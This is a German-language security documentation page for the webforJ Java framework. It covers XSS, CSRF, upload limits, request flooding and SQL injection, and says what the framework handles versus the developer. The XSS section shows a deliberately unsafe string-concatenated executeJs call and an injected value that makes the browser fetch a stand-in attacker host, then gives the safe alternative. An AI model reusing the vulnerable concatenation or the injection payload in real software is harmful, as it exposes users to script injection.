---
sidebar_position: 2
title: Common Threats
description: >-
  How common web threats such as cross-site scripting (XSS), cross-site request
  forgery (CSRF), and SQL injection apply to a webforJ app, what the framework
  handles, and where you stay responsible.
_i18n_hash: f19a2bbb311243417c723fe49ad7d72f
---
Da eine webforJ-App in Java auf dem Server läuft und der Browser lediglich die Benutzeroberfläche rendert (siehe den Artikel [Client/Server-Interaktion](/docs/architecture/client-server)), sind von vornherein mehrere Angriffsarten durch das Design eingeschränkt. Andere hängen jedoch davon ab, wie Sie Ihren Code schreiben. Diese Seite beschreibt die Bedrohungen, die am wichtigsten sind, und zieht eine klare Grenze zwischen dem, was webforJ behandelt, und dem, was Sie zu behandeln haben.

## Cross-Site-Scripting (XSS) {#cross-site-scripting-xss}

Ein Cross-Site-Scripting (XSS)-Angriff ist erfolgreich, wenn eine Zeichenfolge, die als Text angezeigt werden soll, stattdessen im Browser als lebendiges Markup interpretiert wird. webforJ schließt dies standardmäßig aus: Wenn Sie den Text eines Komponenten setzen, wird der Wert wörtlich angezeigt, sodass Tags darin als Zeichen erscheinen und niemals ausgeführt werden.

```java
// Wird als die wörtlichen Zeichen "<b>hi</b>" angezeigt
component.setText("<b>hi</b>");
```

Das Rendern von echtem Markup ist ein separater, bewusster Schritt. webforJ behandelt einen Wert nur dann als Markup, wenn er in `<html>...</html>` eingeschlossen ist, was genau das ist, was die Methode `setHtml` des `HasHtml`-Concerns für Sie im Hintergrund tut. Ein auf andere Weise gesetzter Wert wird zuerst auf reinen Text reduziert.

```java
// Absichtlich als Markup gerendert
component.setHtml("<b>hi</b>");
```

:::danger Markup, für das Sie sich entscheiden, wird nicht für Sie gereinigt
Das Framework reinigt das Markup, das Sie in `<html>` einfügen, nicht. In dem Moment, in dem irgendein Fragment davon von einer Person, einem gespeicherten Datensatz, einer Abfragezeichenfolge oder einer anderen Quelle stammt, die Sie nicht vollständig kontrollieren, reinigen Sie es selbst, bevor es eine Komponente erreicht. Verwenden Sie einen gepflegten Cleaner wie [jsoup](https://jsoup.org/) oder den [OWASP Java HTML Sanitizer](https://owasp.org/www-project-java-html-sanitizer/) und füttern Sie ihn mit einer Erlaubenliste der Tags, die Sie tatsächlich zulassen möchten.
:::

### Ausführen von JavaScript {#executing-javascript}

Die gleiche Regel gilt für die Skripte, die Sie mit `executeJs` und seinen asynchronen Varianten ausführen (die <JavadocLink type="foundation" location="com/webforj/concern/HasJsExecution" code='true'>HasJsExecution</JavadocLink>-API). `executeJs` führt die von Ihnen übergebene Zeichenfolge als Programm aus, sodass alles, was sich in dieser Zeichenfolge befindet, vom Browser ausgeführt wird, einschließlich allem, was Sie von einem nicht vertrauenswürdigen Wert eingefügt haben.

```java
// Gefährlich: Der Wert ist in den Programmtext eingebaut
el.executeJs("greet('" + name + "')");
```

Wenn `name` `'); fetch('https://evil.test'); ('` hält, führt der Browser stattdessen folgendes Programm aus:

```js
greet(''); fetch('https://evil.test'); ('')
```

Der `fetch` des Angreifers ist jetzt eine Anweisung in Ihrem Programm, sodass sie ausgeführt wird. Die Verkettung machte die Eingabe *Teil des Codes*.

Halten Sie nicht vertrauenswürdige Werte vollständig aus dem Skript heraus. Senden Sie den Wert als Daten an den Client, setzen Sie ihn auf das Element und führen Sie dann ein festes Skript aus, das ihn über das Schlüsselwort `component` zurückliest:

```java
// Sicher: Der Wert sind Daten, die das Skript liest, niemals Code
el.setProperty("greetName", name);
el.executeJs("greet(component.greetName)");
```

Hier ist das Programm, das der Browser ausführt, immer nur `greet(component.greetName)`. Es gibt keinen nicht vertrauenswürdigen Input, den es parsen könnte. Der Wert sitzt in einer Eigenschaft, und das Lesen eines Zeichenfolgenwerts führt ihn niemals aus, sodass derselbe `name` als Text an `greet` übergeben wird, anstatt als Code ausgeführt zu werden.

## Cross-Site-Request-Forgery (CSRF) {#cross-site-request-forgery-csrf}

Ein Cross-Site-Request-Forgery (CSRF)-Angriff trickst den Browser eines angemeldeten Benutzers aus, indem er eine Aktion sendet, die der Benutzer niemals beabsichtigt hat. webforJ blockiert dies für seinen eigenen Datenverkehr ohne jegliche Einrichtung: Das Framework vertraut nur Anforderungen, die zur Sitzung des aktuellen Benutzers gehören, sodass eine Seite von einem anderen Ursprung die App nicht im Namen des Benutzers steuern kann.

Dies wird in genau einer Situation sichtbar. [Spring Security](/docs/security/getting-started) aktiviert seinen eigenen Schutz vor gefälschten Anfragen für jede Anfrage, und es hat kein Wissen über den Kanal von webforJ, sodass es den Datenverkehr des Frameworks ablehnen würde und die App nicht geladen werden kann. Die Spring-Integration von webforJ löst dies für Sie: <JavadocLink type="spring-integration" location="com/webforj/spring/security/WebforjSecurityConfigurer" suffix="#webforj()" code='true'>WebforjSecurityConfigurer.webforj()</JavadocLink> sagt Spring, dass es seine Überprüfung für die Anforderungen des webforJ-Frameworks überspringen soll. Das ist sicher, weil das Framework bereits diese Anforderungen selbst schützt, sodass nichts ungeschützt bleibt.

:::info Handgefertigte Spring-Konfiguration
Wenn Sie eine `SecurityFilterChain` ohne den `webforj()`-Helfer zusammenstellen, schließen Sie die Anforderungen des Frameworks selbst von der Überprüfung durch Spring aus und lassen diese Überprüfung für alle Endpunkte, die Sie hinzufügen, aktiviert.
:::

## Unbegrenzt große Datei-Uploads {#unbounded-file-uploads}

Das Akzeptieren von Dateien beliebiger Größe oder Menge lädt zu einem Denial-of-Service-Angriff ein, der durch erschöpften Speicher, Festplattenspeicher oder Bandbreite erfolgt. Begrenzen Sie, was Sie bei den Upload-Komponenten akzeptieren: Sie bieten `setMaxFileSize()` an, um jede Datei zu begrenzen, und `setMaxFiles()`, um zu begrenzen, wie viele auf einmal ankommen.

Betrachten Sie dies als die erste Verteidigungslinie und nicht als die einzige. Eine browserseitige Einschränkung kann umgangen werden, daher sollten Sie auch auf dem Server eine Obergrenze durchsetzen: Setzen Sie `webforj.fileUpload.maxSize` in Ihrer [Konfiguration](/docs/configuration/properties), um übergroße Uploads abzulehnen, bevor sie Ihren Code erreichen, und begrenzen Sie die maximale Anforderungsgröße in Ihrem Servlet-Container oder Reverse-Proxy.

## Anforderungsflut {#request-flooding}

Ein manipulierten Client kann auch versuchen, den Server direkt zu überwältigen: indem er eine einzelne sehr große Anfrage sendet oder neue App-Sitzungen in schneller Folge startet, bis der Speicher oder andere Ressourcen erschöpft sind. Da der Server jede App steuert, erreicht eine Flut beider Arten ihn direkt.

webforJ kann beides begrenzen. Setzen Sie `webforj.security.maxContentLength`, um die Größe einer Anfrage, die die App akzeptiert, in Byte zu begrenzen, und `webforj.security.maxInitPerMinute`, um zu begrenzen, wie viele neue App-Sitzungen pro Minute gestartet werden. Beide sind standardmäßig auf `0` gesetzt, was bedeutet, dass sie deaktiviert sind, also setzen Sie sie für jede Bereitstellung, die untrusted traffic ausgesetzt ist. Siehe [Eigenschaftskonfiguration](/docs/configuration/properties) für Details.

Wie bei Uploads sollten Sie diese auch als innerste Schicht behandeln und die Anforderungsgröße auch in Ihrem Servlet-Container oder Reverse-Proxy begrenzen.

## SQL-Injection {#sql-injection}

webforJ sitzt nirgendwo in Ihrer Datenschicht, sodass der Widerstand gegen SQL-Injection vollständig auf Ihrem Abfragecode beruht. Verwenden Sie parametrisierte Abfragen oder vorbereitete Anweisungen, damit Werte als Parameter gebunden werden, anstatt sie in die Anweisung einzufügen, und bauen Sie niemals eine Abfrage, indem Sie mit Benutzereingaben Strings zusammenfügen. Dies ist eine übliche JDBC- und Persistenzschicht-Praxis, und sie gilt unverändert in einer webforJ-App.
